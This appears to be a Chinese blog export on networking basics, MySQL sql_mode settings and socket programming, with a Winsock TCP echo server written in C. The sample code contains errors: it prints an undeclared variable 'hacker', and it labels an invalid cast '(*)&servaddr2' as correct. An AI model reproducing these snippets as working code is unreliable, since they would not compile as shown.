<h4 id="5-Socket和WebSocket"><a href="#5-Socket和WebSocket" class="headerlink" title="5.Socket和WebSocket"></a>5.Socket和WebSocket</h4><blockquote>
<p>这两个虽然名字差不多，但却是两个完全不同的概念，就好比Java和JavaScript一样毫无关系。Socket是一套协议封装后的接口，用于建立Socket连接，而WebSocket虽然是Html5的产物，但也不仅仅局限于浏览器的应用程序，许多语言都提供了WebSocket的支持，比如C，C++，Python等。</p>
</blockquote>
<h4 id="6-HTTP、WebSocket与TCP的关系"><a href="#6-HTTP、WebSocket与TCP的关系" class="headerlink" title="6.HTTP、WebSocket与TCP的关系"></a>6.HTTP、WebSocket与TCP的关系</h4><blockquote>
<p>HTTP通信过程属于“你推一下，我走一下”的方式，客户端不发请求则服务器永远无法发送数据给客户端，而WebSocket则在进行第一次HTTP请求之后，其他全部采用TCP通道进行双向通讯。所以，HTTP和WebSocket虽都是基于TCP协议，但是两者属于完全不同的两种通讯方式。</p>
</blockquote>
<p>能比较的都比较了，附上一张关系图强化理解。其实，如果不是专攻网络方面，作为一个程序猿，了解了不同的通讯方式及其对应的优缺点，就可以确定其应用的场景。而这些，就已经基本够用了。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
        <tag>TCP</tag>
        <tag>UDP</tag>
        <tag>WebSocket</tag>
        <tag>Socket</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 5.7 SQL_MODE 设置 坑</title>
    <url>/2017/12/mysql-sql-mode/</url>
    <content><![CDATA[<h2 id="MySQL-5-7-SQL-MODE-设置-坑"><a href="#MySQL-5-7-SQL-MODE-设置-坑" class="headerlink" title="MySQL 5.7 SQL_MODE 设置 坑"></a>MySQL 5.7 SQL_MODE 设置 坑</h2><p>1、查看 sql_mode</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="symbol">@sql_mode</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>查询出来的值为：</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ONLY_FULL_GROUP_BY,</span>STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br></pre></td></tr></table></figure>

<p>2、去掉 ONLY_FULL_GROUP_BY 重新设置值。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="meta">@sql</span>_mode =‘STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION‘;</span><br></pre></td></tr></table></figure>

<p>3、上面是改变了全局 sql_mode，对于新建的数据库有效。对于已存在的数据库，则需要在对应的数据下执行：</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">set sql_mode</span> =‘STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION‘;</span><br></pre></td></tr></table></figure>

<p>或者在my.cnf 里面设置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">sql_mode</span>=<span class="string">&#x27;STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在 sql_mode 中去掉 only_full_group_by</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>SQL_MODE</tag>
      </tags>
  </entry>
  <entry>
    <title>Socket（套接字）专题，网络编程必读</title>
    <url>/2017/12/network-socket/</url>
    <content><![CDATA[<h2 id="【名词解释】"><a href="#【名词解释】" class="headerlink" title="【名词解释】"></a>【名词解释】</h2><p>Internet  因特网。专指从 ARPANET 发展而来的连接全球各广域网的唯一网络。</p>
<p>Internet Protocol  网际协议。</p>
<span id="more"></span>

<p>IPv4  网际协议第 4 版。</p>
<p>IPv6  网际协议第 6 版。</p>
<p>TCP&#x2F;IP  传输控制协议 &#x2F; 网际协议。</p>
<p>因特网是互联网的一种 (最大的互联网)，但互联网并不等同于因特网。</p>
<h2 id="【套接字相关的基础知识】"><a href="#【套接字相关的基础知识】" class="headerlink" title="【套接字相关的基础知识】"></a>【套接字相关的基础知识】</h2><hr>
<p>套接字：一种抽象概念或者框架，各操作系统与编程语言对其有不同的实现。</p>
<p>套接字接口：本地（宿主）操作系统提供给客户端以及服务器应用程序进程访问本地的套接字数据结构（等价于和底层操作系统通信）时必须使用的指令集。通常以套接字接口函数的形式存在，供应用程序开发者调用。</p>
<p>套接字接口是网络通信 API 的一种；网络通信 API 的实现有很多种，例如：套接字接口，传输层接口（TLI），STREAM 等。</p>
<p>必须指出：在 TCP&#x2F;IP 协议簇分层中，分组（数据报）或由应用程序产生的字节流数据，在同一个主机的应用层与传输层之间不能直接传递，而是需要传输环境（操作系统）提供的传输对象，载体（套接字数据结构）与传输手段（套接字接口）。</p>
<p>例如，开发人员想开发一个运行在某操作系统环境中，具备网络通信功能的应用程序，则必须使用该操作系统提供的网络通信 API 函数（例如套接字接口函数，其最初在 1980 年代由加州大学伯克利分校的计算机系统研究组在一种叫做 BSD 的类 UNIX 系统内核中实现）来编写应用程序。</p>
<p>（如果是基于 C&#x2F;S，即客户 - 服务器 网络通信模式，则应分别编写客户端版本与服务器版本的应用程序）</p>
<p>这样，当客户端进程与服务器进程通信时，网络通信 API 函数会首先将进程与各自的宿主操作系统通信，然后网络通信 API 函数使用封装在各自宿主操作系统的 TCP&#x2F;IP 协议堆栈中的部分或者全部 4 层协议，来完成实际的（本地与远程）进程间通信。</p>
<p>总而言之，通过调用各自操作系统提供的网络通信 API 函数，客户与服务器进程可以先分别与各自的宿主操作系统通信，然后再进行网络通信。</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">如果应用程序在开发时不利用这些 API 函数已经封装的网络通信功能，则要么开发人员必须自行编写函数来操纵，控制 TCP/<span class="built_in">IP</span> 协议堆栈前 <span class="number">4</span> 层（不包含最高层应用层）的协议来建立连接，发送，接收分组（数据报）以及关闭连接。这会造成极大的编程难度与极低的编程效率。则要么该应用程序就不具备网络通信功能。</span><br></pre></td></tr></table></figure>

<p>一般而言，操作系统的发布厂商会在自己的产品中实现 TCP&#x2F;IP 协议簇的低 4 层，并提供相应的 API 函数给开发网络应用程序的人员来利用这些协议实现网络通信功能。</p>
<blockquote>
<p>套接字数据结构：客户端以及服务器本地创建的数据结构，用于存储各种类型的变量。该数据结构可以通过调用本地操作系统提供的套接字接口函数来创建。</p>
</blockquote>
<h2 id="客户端的套接字数据结构组成"><a href="#客户端的套接字数据结构组成" class="headerlink" title="客户端的套接字数据结构组成"></a>客户端的套接字数据结构组成</h2><pre><code>客户端的 IP 地址（32 位）加上客户端进程的端口号（16 位），对客户端而言是本地套接字地址

服务器的 IP 地址（32 位）加上服务器进程的端口号（16 位），对客户端而言是远程套接字地址

其中，客户端进程的端口号是发送请求时（建立 TCP 连接），临时分配的。这意味着同一 IP 的相同客户端进程在每次请求连接时，被分配的临时端口号也不会与前一次相同，且不能和本地其它进程使用的端口号冲突。

例如，使用 web 浏览器访问同一站点，每次开启的浏览器进程端口号均不同。

本地套接字地址由运行客户端进程的操作系统提供；远程套接字地址可以通过 2 种方法获得：

① 由编写客户 - 服务应用程序（即常说的 C/S 架构）的程序员在测试客户端进程能否正常工作时设定，或者由运行客户端进程的用户指定（一种办法是将 IP 地址作为 cmd 命令行的参数传递给客户端进程的 main 函数）。

② 多数情况下，远程套接字地址的服务器进程端口号都是已知的（即公用熟知端口），关键在于获取服务器的 IP 地址。如果客户端进程接受 URL 格式的因特网域名输入作为服务器 IP 地址，则可以通过本地的另一个叫做 DNS 的客户 - 服务进程将其映射到服务端 IP 地址。
</code></pre>
<h2 id="服务器的套接字数据结构组成"><a href="#服务器的套接字数据结构组成" class="headerlink" title="服务器的套接字数据结构组成"></a>服务器的套接字数据结构组成</h2><pre><code>服务器的 IP 地址（32 位）加上服务器进程的端口号（16 位），对服务器而言是本地套接字地址

客户端的 IP 地址（32 位）加上客户端进程的端口号（16 位），对服务器而言是远程套接字地址

其中，本地套接字地址的 IP 地址部分由服务器操作系统提供；如果是采用因特网管理机构定义的标准应用层协议（如 HTTP，FTP）通信的进程，其端口号部分为默认；如果采用非标准（私人开发且未经批准）的应用层协议通信的进程，需要该进程开发者自行指定不与公认端口冲突的端口；
</code></pre>
<font color='red'>
远程套接字地址的 IP 地址与端口号，需要等到多个客户端请求连接时，从每个客户端的 TCP 数据报文中获得。这通过系统调用 accept () 实现，后者每次从请求队列中取出一个数据报文，创建一个监听套接字的副本（数据传输套接字），然后根据报文的 IP 头部的 “目标地址” 替换数据传输套接字中的 “本地套接字地址” 字段（

<p>如果通过 htonl (INADDR_ANY) 设置监听套接字的本地套接字地址，那么在调用</p>
<p>bind () 时候，绑定到监听套接字的本地套接字地址就是 0.0.0.0，表示在所有网卡的所有 IP 地址上监听连接请求，当实际的远程数据包到达时，从监听套接字复制创建的数据传输套接字的本地套接字地址 0.0.0.0 就会被替换成数据报文 IP 头部的目标地址字段，而数据传输套接字的 “远程套接字地址” 字段，将被替换为数据报文 IP 头部的 “源地址” 字段）</p>
<p>例如我们在本机启动一个 apache httpd 进程（web 服务器），发现它的监听套接字为 0.0.0.0:80 ，这就表示 apache 的编程模型采用了处理本地所有网卡所有 IP 地址上的连接请求的策略。假设本机网卡有个 IP 为 192.168.1.2 ，那么我们在浏览器地址栏输入 192.168.1.2:80 这个请求包将被 httpd 进程处理（它监听所有网卡所有 IP 的 80 端口），此时，httpd 创建一个 0.0.0.0:80 套接字的副本，将其替换为</p>
<p>192.168.1.2:80 ，然后远程套接字地址为浏览器所在的机器 IP 地址：浏览器动态端口。如下图所示：<br></font></p>
<p><img src="/images/2017/wKioL1XgDPWQrtTqAAigym7T69g824.jpeg"></p>
<font color='red'>
上图的演示环境基于 2 台虚拟机：一台 192.168.3.57 运行 httpd 进程，一台 192.168.3.200 使用 web 浏览器对 httpd 发起 TCP 连接。

<p>从二个标识为 1 的位置可以看到，PID 为 1240 的 httpd 父进程，启动时的监听套接字为 0.0.0.0:80 这表明它在编程时，对本地套接字地址的赋值采用的函数 - 参数组合为： htonl (INADDR_ANY)，htonl 函数将 Intel x86&#x2F;x64 架构兼容机的小端（主机）字节序表示法转换为大端（网络）字节序表示法，远程主机接收后才能正确还原为主机字节序表示法；参数 INADDR_ANY 的效果就是在所有网卡所有 IP 地址监听，即上图的 0.0.0.0；可以看到监听套接字的远程地址为 0.0.0.0:0 此时还没有任何远程 IP: 端口与其关联；当在 192.168.3.200 主机上使用浏览器访问 httpd 时，将与 192.168.3.57 主机建立 TCP 连接。我们从 1 处看到 192.168.3.57 的内核协议栈根据数据报文中的目标地址和源地址，填充了新建立套接字（绿色高亮区域）的 “本地套接字地址” 与 “远程套接字地址” 字段，httpd 进程通过系统调用 accept () 来请求内核协议栈执行创建和填充的操作；accept () 执行成功返回新建立套接字的描述符，而实际新建的套接字则是保存在内核空间的数据结构（参考后面的示意图）</p>
<p>因为 httpd 进程空间中的套接字描述符保有对该数据结构的引用，因此我们在 process explorer 的 httpd 进程属性的 TCP&#x2F;IP 标签中，可以查看到这个描述符引用的套接字；当然 httpd 进程不能直接通过套接字描述符直接访问内核空间的相应套接字数据结构，而是需要借助类似 accept () 的系统调用，从用户模式切换到内核模式。现在你明白了为什么 accept () 需要应用进程传递一个监听套接字描述符作为其第一个参数了吧；accetp () 执行后，将处于阻塞状态，这意味着直到接收了远程主机的数据报文，并且创建和填充相应的套接字数据结构后，才返回用户模式（带着相应的描述符）</p>
<p>另外， httpd 子进程不处理任何与网络连接相关的事务，全都由父进程负责，在多进程模型的 Chrome 浏览器中，我们也可以看到类似的情况；</p>
<p>二个标识为 2 处的位置是在 cmd 命令行执行 netstat -ano 输出的相同结果，注意，如果没有通过浏览器与 httpd 建立连接，那么只会显示监听套接字，监听套接字是 httpd 父进程在启动时通过 socket () 系统调用对应的机器指令创建的（返回监听套接字描述符）；</p>
<p>标识为 3 的位置处是在任务管理器列出的 httpd PID，与前面 2 个工具输出的相同。<br></font></p>
<p>下面的客户 - 服务 TCP 连接时序图可以帮助你更清晰的理解上述过程，这张图来自计算机网络教程 —— 自顶向下方法，经过我略微修改以符合上述例子：</p>
<p><img src="/images/2017/wKiom1XhdDOQ-grqAAmE0jtaxDQ090.jpeg"></p>
<p>一般而言，web 服务器进程处理大量不同 IP 用户的并发连接时，在一套接字描述符表中，为每个用户维护单独的套接字描述符，总数可能高达成千上万，每个的本地套接字地址均相同（服务器 IP 地址与进程端口号）；但每个的远程套接字地址都不同，它们表示不同 IP 地址的客户端连接。</p>
<p>套接字描述符：整型变量，用于关联（或者引用，绑定）到特定的套接字数据结构。</p>
<p>套接字数据结构的地址：内存地址，用于寻址套接字数据结构。</p>
<p>套接字地址是一种特定类型的结构变量（struct socketaddr），属于套接字数据结构的 5 个字段（成员）之一。</p>
<p>套接字地址本身又包含 5 个结构成员。例如，对本地套接字地址其中的 3 个重要成员赋值后，即可通过 bind () 将其绑定（添加）到套接字数据结构中。</p>
<hr>
<p>① 操作系统为本地的每个需要进行网络通信的应用程序的进程空间（或称 虚拟的 内存空间）中，都提供一个 套接字描述符表。</p>
<p>② 应用程序（进程）通过 套接字描述符表 中记录的 特定套接字描述符 与 套接字数据结构的地址 之间的映射关系，来访问由操作系统维护的，存储在实际内存中的 套接字数据结构。</p>
<hr>
<p>客户端应用程序（进程）通过向宿主操作系统维护的本地套接字数据结构发送请求，以及从本地套接字数据结构中接收响应，来与服务端应用程序（进程）进行逻辑通信。实际的物理通信由本地 TCP&#x2F;IP 协议堆栈的低 4 层（与对端的低 4 层）进行。</p>
<p>服务端应用程序进程通过从宿主操作系统维护的本地套接字数据结构中接收请求，以及向本地套接字数据结构发送响应，来与客户端应用程序进程进行逻辑通信。实际的物理通信同样由本地 TCP&#x2F;IP 协议堆栈的低 4 层（与对端的低 4 层）进行。</p>
<p>套接字，套接字描述符，套接字地址，应用缓冲区，内核缓冲区。。。的关系参考下图：</p>
<p><img src="/images/2017/wKioL1XgDPWQrtTqAAigym7T69g824.jpeg"></p>
<hr>
<p>每当一个套接字 API 函数需要一个 “指向某特定类型套接字地址结构的 | 内存地址 | 的指针” 作为参数来调用时，该指针需要强制类型转换成 “指向通用类型套接字地址结构的 | 内存地址 | 的指针”，然后才能 | 作为该套接字 API 函数 | 的参数来调用。</p>
<p>例如：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="type">sockaddr_in</span> servaddr;  <span class="comment">//声明一个名为servaddr的“sockaddr_in类型”变量</span></span><br></pre></td></tr></table></figure>

<p>sockaddr_in 结构的定义类似如下形式，不同的系统上可能略有差别：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="type">short</span> sin_family;                <span class="comment">//AF_INET</span></span><br><span class="line">    u_short sin_port;               <span class="comment">//16位端口号，网络字节序   </span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">in_addr</span> sin_addr;       <span class="comment">//结构，其中一个成员存储了32位IP地址信息</span></span><br><span class="line">    <span class="type">char</span> sin_zero[<span class="number">8</span>];             <span class="comment">// 保留</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面我们会用 visual studio 内置的调试工具来近距离分析上述结构，看看 windows 平台是如何实现这个结构的；而在类 UNIX 系统中，可以查看 socket.h 头文件来获取该结构的定义。</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="type">sockaddr</span> servaddr2;  <span class="comment">//定义一个名为servaddr2的“sockaddr类型结构变量”</span></span><br><span class="line"></span><br><span class="line">sockaddr 结构为通用套接字地址结构（注意该结构没有_in 后缀）。</span><br></pre></td></tr></table></figure>

<p>因此</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">connect( <span class="name">sockfd</span>, (<span class="name">*</span>)<span class="symbol">&amp;servaddr</span>, sizeof(<span class="name">servaddr</span>) )<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>上面这种用法错误不被 connect 这个套接字 API 函数接受。因为其第二个参数要求 sockaddr 类型指针，而 (*)&amp;servaddr 是 sockaddr_in 类型指针（编译器会报错，类型不匹配）</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">connect( <span class="name">sockfd</span>, (<span class="name">struct</span> sockaddr*)<span class="symbol">&amp;servaddr</span>, sizeof(<span class="name">servaddr</span>) )<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>上面是正确用法。因为该函数第二个参数仅接受指向 sockaddr 类型变量起始地址的指针，所以将一个 sockaddr 类型指针指向 servaddr 的起始地址，这样就匹配了。</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">connect( <span class="name">sockfd</span>, (<span class="name">*</span>)<span class="symbol">&amp;servaddr2</span>, sizeof(<span class="name">servaddr2</span>) )<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>上面是正确用法。因为 servaddr2 是 sockaddr 类型变量，(*)&amp;servaddr2 就是指向该变量起始地址的指针。</p>
<h2 id="【编程实践】"><a href="#【编程实践】" class="headerlink" title="【编程实践】"></a>【编程实践】</h2><p>下面通过一个简单的服务器端程序来总结前述知识点，该例子源码在 visual studio 2010 上编译，运行，调试通过，使用 windows 网络编程 API ，程序运行后，监听在 tcp 端口 7775 等待客户端连接，并回送客户发来的信息，有了前面的预备知识后，相信你在阅读代码时已经非常清楚系统在底层究竟做了什么事：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pragma comment (lib, &quot;ws2_32.lib&quot;) </span></span><br><span class="line"><span class="comment">#include &lt;windows.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;winsock.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line">int main() &#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    SOCKET server_listen_socket_descriptor, server_handle_connection_socket_descriptor;</span><br><span class="line">    struct sockaddr_in server_addr;</span><br><span class="line">    struct sockaddr_in client_addr;</span><br><span class="line">    int server_handle_connection_socket_data_struct_len = sizeof(struct sockaddr_in);</span><br><span class="line">    WSADATA wsa;</span><br><span class="line">    WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsa);</span><br><span class="line">    char buffer_in_user_space_to_save_process_data_which_send_and_receive [<span class="number">1024</span>];</span><br><span class="line">    char* point_to_buffer_start_address = buffer_in_user_space_to_save_process_data_which_send_and_receive;</span><br><span class="line">    int user_buffer_len = sizeof(buffer_in_user_space_to_save_process_data_which_send_and_receive);</span><br><span class="line">    int the_sucessful_copyed_bytes_to_user_buffer_from_client_each_call_recv = <span class="number">0</span>;</span><br><span class="line">    int the_total_bytes_to_send_back_to_client_each_call_send = <span class="number">0</span>;</span><br><span class="line">    /*下面三行对“本地套接字地址”这个结构体中的<span class="number">3</span>个字段初始化后，才可以调用bind()将其绑定到用于监听的套接字上，bind()执行成功才返回指向</span><br><span class="line">    该套接字（数据结构）的描述符*/</span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    /*一种检测htonl函数作用的方法是，首先在计算器上输入十进制数<span class="number">1921683200</span>转换成<span class="number">16</span>进制数为<span class="number">728</span>a8f00，但是Intel小端法表示</span><br><span class="line">    造成操作系统内部表示为<span class="number">008</span>f8a72，于是我们可以将下面的htonl参数改为<span class="number">0</span>x008f8a72，然后在main函数按f10单步进入调试，</span><br><span class="line">    点击下方的 local局部变量的动态监视表，发现执行完<span class="number">26</span>行之后，server_addr.sin_addr.s_addr的值变为<span class="number">1921683200</span></span><br><span class="line">    证实了htonl将小端序数转换为大端序数，以便在互联网上传输*/</span><br><span class="line">    server_addr.sin_addr.s_addr = htonl(INADDR_ANY); <span class="regexp">/*在所有IP地址上监听*/</span></span><br><span class="line">     </span><br><span class="line">    <span class="regexp">/*htonl()将主机字节顺序(在Intel x86/</span>x64 兼容机上就是小端法)表示的长整型IP地址，转换为网络字节顺序的长整型对应值，    从而保证远程主机能够在接收时正确还原IP地址*/</span><br><span class="line">    server_addr.sin_port = htons(<span class="number">7775</span>);   <span class="regexp">/*htons()将主机字节顺序(在Intel x86/</span>x64 兼容机上就是小端法)表示的短整型端口号，转换为网络字节顺序的短整型对应值，保证远程主机能       够在接收时正确还原端口号。虽然在windows平台上编程时不使用这<span class="number">2</span>个函数转换成网络字节序，编译器检查时也不会报错，但是为了保证程序的可移植性以及可能与异构操作系统通信，</span><br><span class="line">    建议还是将其转换*/</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> ((server_listen_socket_descriptor = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">         </span><br><span class="line">        perror(<span class="string">&quot;Error:  create socket failed !&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((bind(server_listen_socket_descriptor, (struct sockaddr *)&amp;server_addr, sizeof(struct sockaddr))) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">     </span><br><span class="line">        perror(<span class="string">&quot;Error:  binding socket failed !&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((listen(server_listen_socket_descriptor, <span class="number">10</span>)) &lt;<span class="number">0</span>) &#123;</span><br><span class="line">     </span><br><span class="line">        perror(<span class="string">&quot;Error:  listen socket failed !&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">     </span><br><span class="line">    printf(<span class="string">&quot;%s\n&quot;</span>, hacker);</span><br><span class="line">     </span><br><span class="line">    <span class="regexp">//</span>下面这个无限 <span class="keyword">for</span> 循环是作为服务器进程持续运行不可或缺的</span><br><span class="line">    <span class="keyword">for</span> ( ; ;) &#123;</span><br><span class="line">        /*accept()在内核中复制一个与监听套接字数据结构相同的套接字数据结构（handle_connection_socket），然后通过第<span class="number">2</span>个参数（客户套接字地址的起始地址）填充handle_connection_socket中的未初始化远程套接字地址字段</span><br><span class="line">        accept 执行成功则返回指向handle_connection_socket 起始地址的描述符，应用进程后续的收发数据操作都需要通过这个描述符*/</span><br><span class="line">        <span class="keyword">if</span> ((server_handle_connection_socket_descriptor = accept(server_listen_socket_descriptor, (struct sockaddr *)&amp;client_addr, &amp;server_handle_connection_socket_data_struct_len)) &lt;<span class="number">0</span>) &#123;</span><br><span class="line">         </span><br><span class="line">            perror(<span class="string">&quot;Error:  handle client connection failed !&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span> ((the_sucessful_copyed_bytes_to_user_buffer_from_client_each_call_recv = recv(server_handle_connection_socket_descriptor, point_to_buffer_start_address,  user_buffer_len, <span class="number">0</span>)) &gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="regexp">/*每成功调用recv()一次，都返回不为0的实际复制字节数，并且point_to_buffer_start_address指针向后移动实际复制字节的长度，更新为下次调用recv的参数*/</span></span><br><span class="line">            point_to_buffer_start_address += the_sucessful_copyed_bytes_to_user_buffer_from_client_each_call_recv;</span><br><span class="line">            user_buffer_len -= the_sucessful_copyed_bytes_to_user_buffer_from_client_each_call_recv;<span class="regexp">/*每成功调用recv()一次，用户缓冲的大小都减少实际复制的字节数长度，更新为下次调用recv的参数*/</span></span><br><span class="line">            the_total_bytes_to_send_back_to_client_each_call_send += the_sucessful_copyed_bytes_to_user_buffer_from_client_each_call_recv;<span class="regexp">/*每成功调用一次，总共复制的字节数都增加（全局变量），更新为后面调用send返回数据时的参数*/</span></span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="regexp">/*当recv()返回0，所有数据复制到用户缓冲完毕，调用send()回送客户端发过来的数据*/</span></span><br><span class="line">        send(server_handle_connection_socket_descriptor, buffer_in_user_space_to_save_process_data_which_send_and_receive, the_total_bytes_to_send_back_to_client_each_call_send, <span class="number">0</span>);</span><br><span class="line">        closesocket(server_handle_connection_socket_descriptor);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="regexp">/*不关闭监听套接字的原因子在于，它需要持续存在并等待处理下一个客户端连接，当下一个客户连接到来时，再次通过accept()创建处理连接的套接字收发数据*/</span></span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中使用到的变量名虽然长了些，但是并不臭，反而很优雅。因为一眼就能看出变量的用途，不像某些变量名为 s，abc，n，ptr，buffer 等，完全没有任何存在的价值。</p>
<p>由于我直接在代码内关键的逻辑处添加了注释，因此就不再详细解释每行语句的作用；你可以直接复制上面源码，然后在 visual studio 系列 IDE 中创建一个空白 cpp 文件，粘贴代码后直接 F5+F7 编译调试运行。下面是我在 visual studio 2010 中调试该程序的截图，为的是验证 htonl () 函数的作用：上面代码中使用到的变量名虽然长了些，但是并不臭，反而很优雅。因为一眼就能看出变量的用途，不像某些变量名为 s，abc，n，ptr，buffer 等，完全没有任何存在的价值。</p>
<p><img src="/images/2017/wKiom1Xh_mqgfopQABRkZFgr01s075.jpeg"></p>
<p>最后，上面程序的精髓部分在 for 循环内嵌的 while 循环中，执行 recv () 系统调用从内核缓冲区复制远程主机发送的数据到用户空间的缓冲区所使用的算法，其实也没那么复杂，因为内核缓冲通常比应用程序缓冲区要大，一次 recv () 调用可能无法复制完所有的数据，特别是远程主机发送类似流媒体格式的数据流时，所以在 while 循环中计算并更新了 3 个局部变量（声明并初始化在 main 函数内）：</p>
<p>用来追踪每次循环后应用程序缓冲区的使用情况（user_buffer_len）</p>
<p>总共复制的字节数（the_total_bytes_to_send_back_to_client_each_call_send）</p>
<p>本次要把数据复制到缓冲区中的地址（point_to_buffer_start_address ）</p>
<p>当 recv () 返回 0，表明将所有内核接收到的数据复制到应用缓冲，此时满足循环退出条件，于是执行 send () 系统调用 “回送” 所有数据到发送端。</p>
<p>整个算法的设计思路基于下面这张图（还是取自前面那本书，经过适当修改），由于 recv () 每次执行成功，都返回实际复制到用户缓冲的字节数，并且用变量（the_sucessful_copyed_bytes_to_user_buffer_from_client_each_call_recv）</p>
<p>来保存，因此上面 3 个变量与该变量是紧密相关的：</p>
<p><img src="/images/2017/wKioL1Xh6v-iOouMAATi4njrqUs470.jpeg"></p>
<hr>
<h2 id="数据包在网络上传输的大小上限"><a href="#数据包在网络上传输的大小上限" class="headerlink" title="数据包在网络上传输的大小上限"></a>数据包在网络上传输的大小上限</h2><p>位于发送端操作系统 TCP&#x2F;IP 协议栈的传输层 (TCP)，把来自其上层 (应用层进程或程序) 产生的字节流数据，按顺序经分割后封装成各个 TCP 分段，并 (逻辑上的) 传送给接收端的传输层。</p>
<p>字节流数据是指：由应用程序通过一次或多次 “输出” 操作，“写入” 到本地 (发送端) 传输层的套接字数据结构中的数据。该数据实际被存储在本地操作系统的缓冲区中。</p>
<p>是否分割由应用程序产生的原始数据：</p>
<p>√ 取决于在 TCP 连接建立阶段，由对端传输层所通告支持的最大分节大小 (Maximum Segment Size,MSS)。可以将 MSS 视为 (发送端与接收端各自的) 应用层与传输层之间的接口属性。</p>
<p>√ 取决于链路层的最大传输单元 (Maximum Transmission Unit,MTU) 大小。</p>
<p>如果因特网上支持 IPv6 (IP 协议第 6 版) 的路由器具备 “链路层 MTU 发现” 功能，则可以确定在转发数据包时可能经过的路径 (链路) 中，存在 “最小 MTU” 的必经路径 (链路)。</p>
<p>此时分割后的原始应用程序数据块的大小必须保证不得超过此条路径 (链路) 的 MTU 值。</p>
<p>分割操作可由发送端操作系统 TCP&#x2F;IP 协议栈完成，也可以由因特网上的路由器完成。</p>
<p>为了避免因特网上主干节点的路由器过载和提高转发效率，IPv6 通过 “链路层 MTU 发现” 功能，来获取所有必经链路中 MTU 值最小者；或者下一跳直连链路的 MTU 值。同时确保分割操作是由发送端完成而非路由器。</p>
<p>可以将 MTU 视为 (发送端与接收端各自的) 网络层与链路层之间的接口属性。</p>
<p>发送端同接收端网络层逻辑交换的 “协议数据单元”(protocol data unit,PDU) 称为 IP 分组。虽然 IPv4 分组最大能有 65535 字节 (65K Bytes)；IPv6 分组最大能有 65575 字节，但在链路层中，一个封装这些 IP 分组的” 帧 “(两端链路层逻辑交换的 PDU 名称) 通常只有 1500 字节 (1.5K Bytes)，这意味着需要将过大的网络层 IP 分组进行分割才能发送。</p>
<p>IPv6 通过 “路径 MTU 发现” 功能，确保对过大 IP 分组的分割操作由发送端网络层 —— 链路层完成，而非因特网上的路由器。</p>
<hr>
